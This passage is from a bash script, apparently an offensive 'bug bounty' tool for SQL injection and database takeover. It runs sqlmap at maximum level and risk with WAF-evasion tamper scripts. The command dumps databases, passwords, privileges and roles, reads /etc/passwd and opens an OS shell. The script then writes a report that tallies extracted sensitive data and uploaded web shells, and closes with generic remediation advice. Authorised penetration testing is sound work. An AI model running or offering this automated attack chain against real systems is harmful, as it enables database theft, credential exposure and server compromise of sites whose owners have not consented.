        
        # Create SQLMap target file
        grep "http" sqli_takeover/discovery/sql_errors.txt | head -5 > sqli_takeover/exploitation/sqlmap_targets.txt
        
        # Run SQLMap with aggressive options
        sqlmap -m sqli_takeover/exploitation/sqlmap_targets.txt \
               --batch \
               --level=5 \
               --risk=3 \
               --threads=5 \
               --technique=BEUSTQ \
               --tamper=space2comment,charencode,randomcase,between \
               --dbs \
               --tables \
               --columns \
               --dump \
               --passwords \
               --privileges \
               --roles \
               --file-read="/etc/passwd" \
               --os-shell \
               --output-dir=sqli_takeover/exploitation/sqlmap_results/
        
        echo "✅ SQLMap exploitation completed - check sqlmap_results directory"
    else
        echo "⚠️  SQLMap not available or no SQL injection points found"
    fi
    
    echo -e "${GREEN}✅ Advanced exploitation completed${NC}"
}

# Function: Generate comprehensive report
generate_sqli_report() {
    echo -e "${BLUE}📊 Phase 5: Generating Comprehensive Report${NC}"
    
    cat > sqli_takeover/reports/sqli_takeover_report.md << EOF
# 💉 SQL Injection & Database Takeover Report
**Target:** $TARGET  
**Date:** $(date)  
**Methodology:** Advanced SQL Injection with Database Takeover Techniques

## 📊 Executive Summary

### Vulnerabilities Discovered
- **SQL Injection Points:** $(wc -l < sqli_takeover/discovery/sql_errors.txt 2>/dev/null || echo 0)
- **Time-based SQL Injection:** $(wc -l < sqli_takeover/discovery/time_based_sqli.txt 2>/dev/null || echo 0)
- **WAF Bypasses:** $(wc -l < sqli_takeover/discovery/waf_bypass_success.txt 2>/dev/null || echo 0)
- **Database Information Extracted:** $(wc -l < sqli_takeover/databases/version_info.txt 2>/dev/null || echo 0)
- **Sensitive Data Extracted:** $(wc -l < sqli_takeover/databases/extracted_data.txt 2>/dev/null || echo 0)
- **File System Access:** $(wc -l < sqli_takeover/exploitation/file_access.txt 2>/dev/null || echo 0)
- **Web Shells Uploaded:** $(wc -l < sqli_takeover/shells/uploaded_shells.txt 2>/dev/null || echo 0)

## 🔥 Critical Findings

### SQL Injection Vulnerabilities
\`\`\`
$(head -10 sqli_takeover/discovery/sql_errors.txt 2>/dev/null || echo "None found")
\`\`\`

### Database Information
\`\`\`
$(head -5 sqli_takeover/databases/version_responses.txt 2>/dev/null || echo "None extracted")
\`\`\`

### Extracted Sensitive Data
\`\`\`
$(head -5 sqli_takeover/databases/sensitive_data.txt 2>/dev/null || echo "None extracted")
\`\`\`

### File System Access
\`\`\`
$(head -5 sqli_takeover/exploitation/file_contents.txt 2>/dev/null || echo "No file access achieved")
\`\`\`

### Uploaded Web Shells
\`\`\`
$(cat sqli_takeover/shells/uploaded_shells.txt 2>/dev/null || echo "No shells uploaded")
\`\`\`

## 🛡️ Impact Assessment

### Business Impact
- **Data Breach Risk:** $([ -f "sqli_takeover/databases/sensitive_data.txt" ] && echo "HIGH - Sensitive data extracted" || echo "MEDIUM - Database access possible")
- **System Compromise:** $([ -f "sqli_takeover/shells/uploaded_shells.txt" ] && echo "CRITICAL - Web shells uploaded" || echo "HIGH - File system access possible")
- **Privilege Escalation:** $([ -f "sqli_takeover/exploitation/privilege_escalation.txt" ] && echo "HIGH - Database privileges identified" || echo "MEDIUM - Standard database access")

### Technical Impact
- Database information disclosure
- Potential complete database compromise
- File system access and manipulation
- Web application compromise
- Potential lateral movement

## 🔧 Remediation Recommendations

### Immediate Actions
1. **Input Validation:** Implement strict input validation and sanitization
2. **Parameterized Queries:** Use prepared statements and parameterized queries
3. **Least Privilege:** Apply principle of least privilege to database accounts
4. **WAF Implementation:** Deploy and configure Web Application Firewall
5. **Database Hardening:** Remove unnecessary database features and functions

### Long-term Security Measures
1. **Code Review:** Conduct thorough security code review
2. **Security Testing:** Implement regular penetration testing
3. **Monitoring:** Deploy database activity monitoring
4. **Encryption:** Implement database encryption at rest and in transit
5. **Backup Security:** Secure database backups and test recovery procedures

## 📁 Evidence Files
- SQL Injection Points: sqli_takeover/discovery/sql_errors.txt
- Database Information: sqli_takeover/databases/version_info.txt
- Extracted Data: sqli_takeover/databases/sensitive_data.txt
- File Access: sqli_takeover/exploitation/file_access.txt
- Web Shells: sqli_takeover/shells/uploaded_shells.txt
- SQLMap Results: sqli_takeover/exploitation/sqlmap_results/

## 🎯 CVSS Scoring
**Base Score:** $([ -f "sqli_takeover/shells/uploaded_shells.txt" ] && echo "9.8 (Critical)" || echo "8.1 (High)")  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---
*Report generated by Elite Bug Bounty SQL Injection Takeover Tool*
EOF

    echo -e "${GREEN}✅ Comprehensive report generated: sqli_takeover/reports/sqli_takeover_report.md${NC}"
    
    # Generate summary statistics
    echo -e "${CYAN}📊 Final Statistics:${NC}"
    echo -e "   🎯 SQL Injection Points: $(wc -l < sqli_takeover/discovery/sql_errors.txt 2>/dev/null || echo 0)"
    echo -e "   ⏱️  Time-based SQLi: $(wc -l < sqli_takeover/discovery/time_based_sqli.txt 2>/dev/null || echo 0)"
    echo -e "   🛡️  WAF Bypasses: $(wc -l < sqli_takeover/discovery/waf_bypass_success.txt 2>/dev/null || echo 0)"
    echo -e "   🗃️  Database Info: $(wc -l < sqli_takeover/databases/version_info.txt 2>/dev/null || echo 0)"
    echo -e "   💰 Sensitive Data: $(wc -l < sqli_takeover/databases/extracted_data.txt 2>/dev/null || echo 0)"
    echo -e "   📁 File Access: $(wc -l < sqli_takeover/exploitation/file_access.txt 2>/dev/null || echo 0)"
    echo -e "   🐚 Web Shells: $(wc -l < sqli_takeover/shells/uploaded_shells.txt 2>/dev/null || echo 0)"
}

# Main execution function
main() {
    echo -e "${GREEN}🚀 Starting Advanced SQL Injection & Database Takeover${NC}"
    
    sqli_target_discovery
    advanced_sqli_detection
    database_enumeration
    advanced_exploitation
    generate_sqli_report
    
    echo -e "${GREEN}🎉 SQL Injection & Database Takeover Assessment Completed!${NC}"
    echo -e "${GREEN}📊 Check the 'sqli_takeover' directory for all results${NC}"
    echo -e "${GREEN}📋 Read 'sqli_takeover/reports/sqli_takeover_report.md' for detailed findings${NC}"
}

# Run main function
main
